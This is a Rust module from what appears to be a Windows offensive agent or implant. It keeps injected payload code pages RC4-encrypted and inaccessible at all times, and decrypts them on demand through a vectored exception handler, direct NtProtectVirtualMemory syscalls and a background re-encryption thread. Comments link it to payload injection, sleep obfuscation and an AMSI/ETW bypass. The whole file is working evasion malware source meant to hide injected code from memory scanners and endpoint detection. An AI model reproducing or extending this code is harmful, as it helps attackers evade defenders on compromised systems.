//! Continuous Memory Hiding — "Evanesco"
//!
//! Keeps all enrolled pages in an encrypted / `PAGE_NOACCESS` state at ALL
//! times, not just during sleep.  When code needs to access a page it
//! acquires a [`PageGuard`] (RAII) which decrypts the page temporarily;
//! the guard re-encrypts it on drop.  A VEH handler auto-decrypts pages on
//! `STATUS_ACCESS_VIOLATION` when execution hits a tracked `PAGE_NOACCESS`
//! region, and a background re-encryption thread periodically re-encrypts
//! pages that have been idle longer than a configurable threshold.
//!
//! # Encryption
//!
//! Per-page **RC4** (16-byte key) is chosen over XChaCha20-Poly1305 for
//! speed in the frequent encrypt/decrypt cycle.  The full XChaCha20-Poly1305
//! sleep sweep in `memory_guard.rs` / `sleep_obfuscation.rs` continues to
//! handle the complete memory encryption during sleep periods.
//!
//! # Integration
//!
//! - **`memory_guard.rs`**: Evanesco is an additional layer; the existing
//!   XChaCha20-Poly1305 key protection continues unchanged.
//! - **`sleep_obfuscation.rs`**: On sleep, Evanesco encrypts all tracked
//!   pages immediately.  On wake, only the minimum required pages are
//!   decrypted.
//! - **`injection_engine.rs`**: Payload code sections are enrolled for
//!   tracking after injection.
//!
//! # Feature gate
//!
//! The entire module is compiled only when both `cfg(windows)` and the
//! `evanesco` feature are active.

#![cfg(all(windows, feature = "evanesco"))]

use anyhow::{anyhow, Result};
use std::collections::HashMap;
use std::ptr;
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex, OnceLock, RwLock};
use std::time::Instant;

// ── Windows constants ────────────────────────────────────────────────────────

/// PAGE_NOACCESS protection constant.
const PAGE_NOACCESS: u32 = 0x01;
/// PAGE_READWRITE protection constant.
const PAGE_READWRITE: u32 = 0x04;
/// PAGE_EXECUTE_READ protection constant.
const PAGE_EXECUTE_READ: u32 = 0x20;

/// STATUS_ACCESS_VIOLATION exception code (0xC0000005).
const STATUS_ACCESS_VIOLATION: u32 = 0xC0000005;

/// VEH return: continue execution (exception handled).
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// VEH return: continue searching (exception not handled).
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Current process pseudo-handle (-1).
const CURRENT_PROCESS: u64 = std::u64::MAX;

// ── RC4 implementation ──────────────────────────────────────────────────────

/// RC4 key length in bytes.
const RC4_KEY_LEN: usize = 16;

/// Initialise an RC4 key-schedule (S-box) from a 16-byte key.
fn rc4_init(key: &[u8; RC4_KEY_LEN]) -> [u8; 256] {
    let mut s = [0u8; 256];
    for (i, v) in s.iter_mut().enumerate() {
        *v = i as u8;
    }
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % RC4_KEY_LEN]);
        s.swap(i, j as usize);
    }
    s
}

/// RC4 encrypt/decrypt (symmetric) in-place using the given S-box state.
/// The S-box is consumed so each encryption is unique (stream cipher).
fn rc4_crypt(s: &mut [u8; 256], data: &mut [u8]) {
    let mut i: u8 = 0;
    let mut j: u8 = 0;
    for byte in data.iter_mut() {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
        *byte ^= k;
    }
}

/// Generate a random 16-byte RC4 key.
fn random_rc4_key() -> [u8; RC4_KEY_LEN] {
    let mut key = [0u8; RC4_KEY_LEN];
    // Use a simple entropy source — combine address-space layout randomness
    // with a monotonic counter and a hash of the current time.
    let t = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default();
    let seed = (t.as_nanos() as u64).wrapping_add(
        (&key as *const [u8; RC4_KEY_LEN]) as usize as u64,
    );
    // Xorshift64 to fill the key
    let mut state = seed;
    for chunk in key.chunks_exact_mut(8) {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        chunk.copy_from_slice(&state.to_le_bytes());
    }
    key
}

// ── Page state machine ───────────────────────────────────────────────────────

/// Tracked page state.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PageState {
    /// Page is encrypted and set to PAGE_NOACCESS.
    Encrypted,
    /// Page is decrypted for read/write access (PAGE_READWRITE).
    DecryptedRW,
    /// Page is decoded for execution (PAGE_EXECUTE_READ).
    DecodedRX,
}

/// Access type requested when acquiring a page.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AccessType {
    /// Read/write access → PAGE_READWRITE.
    ReadWrite,
    /// Execute access → PAGE_EXECUTE_READ.
    Execute,
}

impl AccessType {
    /// Convert to a Windows PAGE_* protection constant.
    fn to_protect(self) -> u32 {
        match self {
            AccessType::ReadWrite => PAGE_READWRITE,
            AccessType::Execute => PAGE_EXECUTE_READ,
        }
    }

    /// Convert to the corresponding [`PageState`].
    fn to_state(self) -> PageState {
        match self {
            AccessType::ReadWrite => PageState::DecryptedRW,
            AccessType::Execute => PageState::DecodedRX,
        }
    }
}

/// Per-page metadata stored inside the tracker.
#[derive(Debug)]
pub struct PageInfo {
    /// Base address of the page (page-aligned).
    pub base: usize,
    /// Size of the tracked region in bytes.
    pub size: usize,
    /// Current state of the page.
    pub state: PageState,
    /// Per-page RC4 key (16 bytes).
    pub rc4_key: [u8; RC4_KEY_LEN],
    /// Instant of the last decrypt (transition away from Encrypted).
    pub last_access: Instant,
    /// Original protection when the page was enrolled.
    pub orig_protect: u32,
    /// Label for debugging / telemetry (e.g. "payload.text").
    pub label: String,
}

// ── PageGuard (RAII) ────────────────────────────────────────────────────────

/// RAII guard that decrypts pages on creation and re-encrypts them on drop.
///
/// Obtain via [`PageTracker::acquire_pages`].  While the guard exists the
/// covered pages are in a decrypted state with the requested access
/// protection.  When the guard is dropped the pages are immediately
/// re-encrypted and set back to `PAGE_NOACCESS`.
pub struct PageGuard {
    /// Ranges covered by this guard: (base, size).
    ranges: Vec<(usize, usize)>,
    /// The access type that was applied.
    access: AccessType,
    /// Dropped flag to prevent double-drop on panic paths.
    dropped: bool,
}

impl PageGuard {
    fn new(ranges: Vec<(usize, usize)>, access: AccessType) -> Self {
        Self {
            ranges,
            access,
            dropped: false,
        }
    }

    /// Access type of this guard.
    pub fn access_type(&self) -> AccessType {
        self.access
    }

    /// Manually release the guard early (re-encrypts now instead of on drop).
    pub fn release(mut self) {
        self.re_encrypt();
        self.dropped = true;
    }

    /// Internal re-encryption logic called from Drop or release().
    fn re_encrypt(&self) {
        let tracker = match GLOBAL_TRACKER.get() {
            Some(t) => t,
            None => return,
        };
        let mut pages = match tracker.pages.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        for &(base, size) in &self.ranges {
            encrypt_page_unlocked(&mut pages, base, size);
        }
    }
}

impl Drop for PageGuard {
    fn drop(&mut self) {
        if !self.dropped {
            self.re_encrypt();
        }
    }
}

// ── Internal helpers ─────────────────────────────────────────────────────────

/// Encrypt a single page region and set PAGE_NOACCESS.
///
/// Caller must hold the `pages` write lock.
fn encrypt_page_unlocked(
    pages: &mut HashMap<usize, PageInfo>,
    base: usize,
    size: usize,
) {
    if let Some(info) = pages.get_mut(&base) {
        if info.state == PageState::Encrypted {
            return; // already encrypted
        }
        // RC4 encrypt the page contents in-place.
        let mut sbox = rc4_init(&info.rc4_key);
        // Safety: the page is currently decrypted (RW or RX) so it is safe
        // to read/write.
        unsafe {
            let ptr = base as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, size);
            rc4_crypt(&mut sbox, slice);
        }
        // Set PAGE_NOACCESS via direct syscall.
        let mut old_prot: u32 = 0;
        let status = unsafe {
            crate::syscalls::syscall_NtProtectVirtualMemory(
                CURRENT_PROCESS,
                &base as *const usize as u64,
                &size as *const usize as u64,
                PAGE_NOACCESS as u64,
                &mut old_prot as *mut u32 as u64,
            )
        };
        if status < 0 {
            log::error!(
                "evanesco: NtProtectVirtualMemory(PAGE_NOACCESS) failed for {:?} status={:#x}",
                info.label,
                status as u32
            );
            // Leave the page encrypted but mark it so we don't lose track.
            // It will be PAGE_NOACCESS on next attempt.
        }
        info.state = PageState::Encrypted;
    }
}

/// Decrypt a single page region and set the requested protection.
///
/// Caller must hold the `pages` write lock.
fn decrypt_page_unlocked(
    pages: &mut HashMap<usize, PageInfo>,
    base: usize,
    size: usize,
    access: AccessType,
) -> bool {
    if let Some(info) = pages.get_mut(&base) {
        if info.state != PageState::Encrypted {
            // Already decrypted — just update access time.
            info.last_access = Instant::now();
            return true;
        }
        // First change protection so we can write to the page.
        let new_prot = access.to_protect();
        let mut old_prot: u32 = 0;
        let status = unsafe {
            crate::syscalls::syscall_NtProtectVirtualMemory(
                CURRENT_PROCESS,
                &base as *const usize as u64,
                &size as *const usize as u64,
                new_prot as u64,
                &mut old_prot as *mut u32 as u64,
            )
        };
        if status < 0 {
            log::error!(
                "evanesco: NtProtectVirtualMemory({:?}) failed for {:?} status={:#x}",
                access,
                info.label,
                status as u32
            );
            return false;
        }
        // RC4 decrypt (same operation as encrypt — symmetric).
        let mut sbox = rc4_init(&info.rc4_key);
        unsafe {
            let ptr = base as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, size);
            rc4_crypt(&mut sbox, slice);
        }
        info.state = access.to_state();
        info.last_access = Instant::now();
        return true;
    }
    false
}

// ── PageTracker ──────────────────────────────────────────────────────────────

/// Core page-tracking state shared between the VEH handler, background
/// thread, and public API.
struct PageTrackerInner {
    /// Map from page-aligned base address to per-page metadata.
    pages: RwLock<HashMap<usize, PageInfo>>,
    /// Idle threshold in milliseconds. Pages idle longer than this are
    /// re-encrypted by the background thread.
    idle_threshold_ms: AtomicU64,
    /// Scan interval in milliseconds for the background thread.
    scan_interval_ms: AtomicU64,
    /// Statistics: total encrypt calls.
    encrypt_count: AtomicUsize,
    /// Statistics: total decrypt calls.
    decrypt_count: AtomicUsize,
    /// Shutdown flag for the background thread.
    shutdown: AtomicBool,
    /// Handle to the background thread (joined on drop).
    thread_handle: Mutex<Option<std::thread::JoinHandle<()>>>,
    /// VEH registration handle (for removal on shutdown).
    veh_handle: Mutex<Option<usize>>,
}

/// Global singleton tracker.
static GLOBAL_TRACKER: OnceLock<Arc<PageTrackerInner>> = OnceLock::new();

/// Initialise the global page tracker.  Must be called once during agent
/// startup, **before** any AMSI/ETW bypass activation.
///
/// - `idle_threshold_ms`: Pages idle longer than this are re-encrypted.
/// - `scan_interval_ms`: Background thread scan interval.
pub fn init(idle_threshold_ms: u64, scan_interval_ms: u64) -> Result<()> {
    let inner = Arc::new(PageTrackerInner {
        pages: RwLock::new(HashMap::new()),
        idle_threshold_ms: AtomicU64::new(idle_threshold_ms),
        scan_interval_ms: AtomicU64::new(scan_interval_ms),
        encrypt_count: AtomicUsize::new(0),
        decrypt_count: AtomicUsize::new(0),
        shutdown: AtomicBool::new(false),
        thread_handle: Mutex::new(None),
        veh_handle: Mutex::new(None),
    });

    // Register VEH handler BEFORE anything else.
    register_veh(&inner)?;

    // Spawn background re-encryption thread.
    spawn_background_thread(&inner)?;

    GLOBAL_TRACKER
        .set(inner)
        .map_err(|_| anyhow!("evanesco: init called more than once"))?;

    log::info!(
        "evanesco: initialised (idle_threshold={}ms, scan_interval={}ms)",
        idle_threshold_ms,
        scan_interval_ms
    );
    Ok(())
}

/// Shut down the Evanesco subsystem.  Decrypts all tracked pages and
/// removes the VEH handler.  Called during agent shutdown.
pub fn shutdown() {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return,
    };

    // Signal the background thread to stop.
    inner.shutdown.store(true, Ordering::SeqCst);

    // Join the background thread.
    if let Ok(mut guard) = inner.thread_handle.lock() {
        if let Some(handle) = guard.take() {
            let _ = handle.join();
        }
    }

    // Decrypt all pages back to their original state.
    {
        let mut pages = match inner.pages.write() {
            Ok(g) => g,
            Err(_) => return,
        };
        for (&base, info) in pages.iter_mut() {
            if info.state == PageState::Encrypted {
                // Restore original protection first.
                let mut old_prot: u32 = 0;
                let status = unsafe {
                    crate::syscalls::syscall_NtProtectVirtualMemory(
                        CURRENT_PROCESS,
                        &base as *const usize as u64,
                        &info.size as *const usize as u64,
                        info.orig_protect as u64,
                        &mut old_prot as *mut u32 as u64,
                    )
                };
                if status >= 0 {
                    let mut sbox = rc4_init(&info.rc4_key);
                    unsafe {
                        let ptr = base as *mut u8;
                        let slice =
                            std::slice::from_raw_parts_mut(ptr, info.size);
                        rc4_crypt(&mut sbox, slice);
                    }
                    info.state = match info.orig_protect {
                        p if p == PAGE_EXECUTE_READ => PageState::DecodedRX,
                        _ => PageState::DecryptedRW,
                    };
                }
            }
        }
        pages.clear();
    }

    // Remove VEH handler.
    if let Ok(mut guard) = inner.veh_handle.lock() {
        if let Some(handle) = guard.take() {
            unsafe {
                remove_veh(handle);
            }
        }
    }

    log::info!("evanesco: shutdown complete");
}

// ── VEH handler ──────────────────────────────────────────────────────────────

/// Register the Vectored Exception Handler for auto-decryption.
fn register_veh(inner: &Arc<PageTrackerInner>) -> Result<()> {
    use winapi::um::errhandlingapi::AddVectoredExceptionHandler;

    // Store a raw pointer to the inner tracker in a module-level static.
    // The Arc is never dropped while the VEH is registered (shutdown
    // removes the VEH before releasing the Arc).
    VEH_TRACKER_PTR
        .set(Arc::as_ptr(inner))
        .map_err(|_| anyhow!("evanesco: VEH tracker pointer already set"))?;

    let handle = unsafe {
        AddVectoredExceptionHandler(
            1, // first handler
            Some(veh_handler),
        )
    };
    if handle.is_null() {
        return Err(anyhow!("evanesco: AddVectoredExceptionHandler failed"));
    }
    if let Ok(mut guard) = inner.veh_handle.lock() {
        *guard = Some(handle as usize);
    }
    log::debug!("evanesco: VEH registered at {:?}", handle);
    Ok(())
}

/// Remove a previously registered VEH handler.
unsafe fn remove_veh(handle: usize) {
    use winapi::um::errhandlingapi::RemoveVectoredExceptionHandler;
    RemoveVectoredExceptionHandler(handle as *mut _);
}

/// Module-level static holding the raw pointer to the tracker inner,
/// accessible from the bare VEH function pointer.
static VEH_TRACKER_PTR: OnceLock<*const PageTrackerInner> = OnceLock::new();

/// VEH handler for STATUS_ACCESS_VIOLATION on tracked PAGE_NOACCESS pages.
///
/// When the exception address falls within a tracked page that is currently
/// `Encrypted` (PAGE_NOACCESS), this handler:
/// 1. Decrypts the page with RC4.
/// 2. Sets the protection to `PAGE_EXECUTE_READ` (since the fault is from
///    execution).
/// 3. Returns `EXCEPTION_CONTINUE_EXECUTION` to resume the faulting
///    instruction.
unsafe extern "system" fn veh_handler(
    exception_info: *mut winapi::um::winnt::EXCEPTION_POINTERS,
) -> i32 {
    let ei = match (exception_info).as_ref() {
        Some(ei) => ei,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    let record = match ei.ExceptionRecord.as_ref() {
        Some(r) => r,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    // Only handle STATUS_ACCESS_VIOLATION.
    if record.ExceptionCode != STATUS_ACCESS_VIOLATION {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let fault_addr = record.ExceptionInformation[1] as usize;

    // Retrieve the tracker pointer from the module-level static.
    let inner_ptr = match VEH_TRACKER_PTR.get() {
        Some(&p) => p,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };
    let inner = &*inner_ptr;

    // Quick check: page-align the fault address and see if it's tracked.
    let page_base = fault_addr & !0xFFF;
    {
        let pages = match inner.pages.read() {
            Ok(g) => g,
            Err(_) => return EXCEPTION_CONTINUE_SEARCH,
        };
        if !pages.contains_key(&page_base) {
            return EXCEPTION_CONTINUE_SEARCH;
        }
    } // release read lock before write

    // Decrypt the page.
    let mut pages = match inner.pages.write() {
        Ok(g) => g,
        Err(_) => return EXCEPTION_CONTINUE_SEARCH,
    };

    // The fault is from execution (RIP landed on the page), so use
    // Execute access.
    let size = match pages.get(&page_base) {
        Some(i) => i.size,
        None => return EXCEPTION_CONTINUE_SEARCH,
    };

    if decrypt_page_unlocked(&mut pages, page_base, size, AccessType::Execute) {
        inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
        EXCEPTION_CONTINUE_EXECUTION
    } else {
        EXCEPTION_CONTINUE_SEARCH
    }
}

// ── Background re-encryption thread ──────────────────────────────────────────

/// Spawn the background thread that periodically re-encrypts idle pages.
fn spawn_background_thread(inner: &Arc<PageTrackerInner>) -> Result<()> {
    let inner_clone = Arc::clone(inner);
    let handle = std::thread::Builder::new()
        .name(
            String::from_utf8_lossy(&string_crypt::enc_str!("evanesco-bg"))
                .trim_end_matches('\0')
                .to_string(),
        )
        .spawn(move || {
            background_loop(&inner_clone);
        })
        .map_err(|e| anyhow!("evanesco: failed to spawn background thread: {}", e))?;

    if let Ok(mut guard) = inner.thread_handle.lock() {
        *guard = Some(handle);
    }
    Ok(())
}

fn background_loop(inner: &Arc<PageTrackerInner>) {
    loop {
        if inner.shutdown.load(Ordering::SeqCst) {
            break;
        }

        let scan_ms = inner.scan_interval_ms.load(Ordering::Relaxed);
        std::thread::sleep(std::time::Duration::from_millis(scan_ms));

        if inner.shutdown.load(Ordering::SeqCst) {
            break;
        }

        let threshold_ms = inner.idle_threshold_ms.load(Ordering::Relaxed);
        let now = Instant::now();

        // Collect pages to re-encrypt under read lock.
        let to_encrypt: Vec<(usize, usize)> = {
            let pages = match inner.pages.read() {
                Ok(g) => g,
                Err(_) => continue,
            };
            pages
                .iter()
                .filter(|(_, info)| {
                    info.state != PageState::Encrypted
                        && now.duration_since(info.last_access).as_millis()
                            >= threshold_ms as u128
                })
                .map(|(&base, info)| (base, info.size))
                .collect()
        };

        // Re-encrypt each page under write lock.
        if !to_encrypt.is_empty() {
            let mut pages = match inner.pages.write() {
                Ok(g) => g,
                Err(_) => continue,
            };
            for (base, size) in to_encrypt {
                encrypt_page_unlocked(&mut pages, base, size);
                inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Enrol a memory region for continuous tracking.
///
/// The region is immediately encrypted and set to `PAGE_NOACCESS`.
/// The `label` is used for logging/telemetry.
pub fn enroll(base: *mut u8, size: usize, orig_protect: u32, label: &str) -> Result<()> {
    let inner = GLOBAL_TRACKER
        .get()
        .ok_or_else(|| anyhow!("evanesco: not initialised"))?;

    // Page-align base.
    let aligned_base = (base as usize) & !0xFFF;
    let end = ((base as usize + size + 0xFFF) & !0xFFF);
    let aligned_size = end - aligned_base;

    let info = PageInfo {
        base: aligned_base,
        size: aligned_size,
        state: PageState::Encrypted, // will be encrypted below
        rc4_key: random_rc4_key(),
        last_access: Instant::now(),
        orig_protect,
        label: label.to_string(),
    };

    {
        let mut pages = inner.pages.write().map_err(|e| {
            anyhow!("evanesco: failed to acquire pages lock: {}", e)
        })?;
        pages.insert(aligned_base, info);
    }

    // Now encrypt the page.
    {
        let mut pages = inner.pages.write().map_err(|e| {
            anyhow!("evanesco: failed to acquire pages lock: {}", e)
        })?;
        // The page starts decrypted (caller just gave us the memory), so we
        // need to set up the initial state properly.  First, set it to
        // DecryptedRW so encrypt_page_unlocked will actually encrypt it.
        if let Some(info) = pages.get_mut(&aligned_base) {
            info.state = PageState::DecryptedRW;
        }
        encrypt_page_unlocked(&mut pages, aligned_base, aligned_size);
        inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
    }

    log::debug!(
        "evanesco: enrolled region base={:#x} size={} label={:?}",
        aligned_base,
        aligned_size,
        label
    );
    Ok(())
}

/// Acquire temporary access to a set of tracked pages.  Returns a [`PageGuard`]
/// that decrypts the pages on creation and re-encrypts them on drop.
///
/// # Safety
///
/// The caller must ensure that the ranges correspond to enrolled pages and
/// that no other thread is accessing those pages concurrently in a way that
/// would be invalidated by the protection change.
pub fn acquire_pages(
    ranges: &[(usize, usize)],
    access: AccessType,
) -> Result<PageGuard> {
    let inner = GLOBAL_TRACKER
        .get()
        .ok_or_else(|| anyhow!("evanesco: not initialised"))?;

    let mut pages = inner.pages.write().map_err(|e| {
        anyhow!("evanesco: failed to acquire pages lock: {}", e)
    })?;

    for &(base, size) in ranges {
        decrypt_page_unlocked(&mut pages, base, size, access);
        inner.decrypt_count.fetch_add(1, Ordering::Relaxed);
    }

    Ok(PageGuard::new(ranges.to_vec(), access))
}

/// Encrypt ALL tracked pages immediately.  Used by sleep_obfuscation before
/// the full memory sweep.
pub fn encrypt_all() {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return,
    };

    let mut pages = match inner.pages.write() {
        Ok(g) => g,
        Err(_) => return,
    };

    for (&base, info) in pages.iter_mut() {
        if info.state != PageState::Encrypted {
            encrypt_page_unlocked(&mut pages, base, info.size);
            inner.encrypt_count.fetch_add(1, Ordering::Relaxed);
        }
    }
}

/// Decrypt a minimum set of pages needed for the agent to function after
/// wake-up.  Currently decrypts nothing by default — callers should use
/// `acquire_pages` for specific regions they need.
pub fn decrypt_minimum() {
    // After wake-up the agent relies on acquire_pages / VEH for on-demand
    // decryption.  This function is a no-op but exists as an explicit
    // integration point for sleep_obfuscation.
}

/// Update the idle threshold at runtime.
pub fn set_idle_threshold(ms: u64) {
    if let Some(inner) = GLOBAL_TRACKER.get() {
        inner.idle_threshold_ms.store(ms, Ordering::Relaxed);
        log::info!("evanesco: idle threshold updated to {}ms", ms);
    }
}

/// Get the current idle threshold.
pub fn idle_threshold() -> u64 {
    GLOBAL_TRACKER
        .get()
        .map(|i| i.idle_threshold_ms.load(Ordering::Relaxed))
        .unwrap_or(0)
}

/// Return a JSON status snapshot of the Evanesco subsystem.
pub fn status_json() -> String {
    let inner = match GLOBAL_TRACKER.get() {
        Some(t) => t,
        None => return r#"{"error":"not initialised"}"#.to_string(),
    };

    let pages = match inner.pages.read() {
        Ok(g) => g,
        Err(_) => return r#"{"error":"lock poisoned"}"#.to_string(),
    };

    let total = pages.len();
    let mut encrypted = 0usize;
    let mut decrypted_rw = 0usize;
    let mut decoded_rx = 0usize;
    for info in pages.values() {
        match info.state {
            PageState::Encrypted => encrypted += 1,
            PageState::DecryptedRW => decrypted_rw += 1,
            PageState::DecodedRX => decoded_rx += 1,
        }
    }

    format!(
        r#"{{"total_pages":{},"encrypted":{},"decrypted_rw":{},"decoded_rx":{},"idle_threshold_ms":{},"scan_interval_ms":{},"encrypt_count":{},"decrypt_count":{}}}"#,
        total,
        encrypted,
        decrypted_rw,
        decoded_rx,
        inner.idle_threshold_ms.load(Ordering::Relaxed),
        inner.scan_interval_ms.load(Ordering::Relaxed),
        inner.encrypt_count.load(Ordering::Relaxed),
        inner.decrypt_count.load(Ordering::Relaxed),
    )
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rc4_roundtrip() {
        let key = [0x42u8; RC4_KEY_LEN];
        let original = b"Hello, Evanesco! This is a test of RC4 encryption.";
        let mut data = original.to_vec();

        let mut sbox_enc = rc4_init(&key);
        rc4_crypt(&mut sbox_enc, &mut data);
        assert_ne!(&data[..], &original[..]);

        let mut sbox_dec = rc4_init(&key);
        rc4_crypt(&mut sbox_dec, &mut data);
        assert_eq!(&data[..], &original[..]);
    }

    #[test]
    fn test_rc4_empty() {
        let key = [0xABu8; RC4_KEY_LEN];
        let mut data: Vec<u8> = Vec::new();
        let mut sbox = rc4_init(&key);
        rc4_crypt(&mut sbox, &mut data);
        assert!(data.is_empty());
    }

    #[test]
    fn test_rc4_different_keys_produce_different_ciphertext() {
        let key_a = [0x01u8; RC4_KEY_LEN];
        let key_b = [0x02u8; RC4_KEY_LEN];
        let plaintext = b"Same plaintext different keys";
        let mut data_a = plaintext.to_vec();
        let mut data_b = plaintext.to_vec();

        let mut sbox_a = rc4_init(&key_a);
        rc4_crypt(&mut sbox_a, &mut data_a);

        let mut sbox_b = rc4_init(&key_b);
        rc4_crypt(&mut sbox_b, &mut data_b);

        assert_ne!(data_a, data_b);
    }

    #[test]
    fn test_page_state_transitions() {
        assert_eq!(AccessType::ReadWrite.to_protect(), PAGE_READWRITE);
        assert_eq!(AccessType::Execute.to_protect(), PAGE_EXECUTE_READ);
        assert_eq!(AccessType::ReadWrite.to_state(), PageState::DecryptedRW);
        assert_eq!(AccessType::Execute.to_state(), PageState::DecodedRX);
    }
}
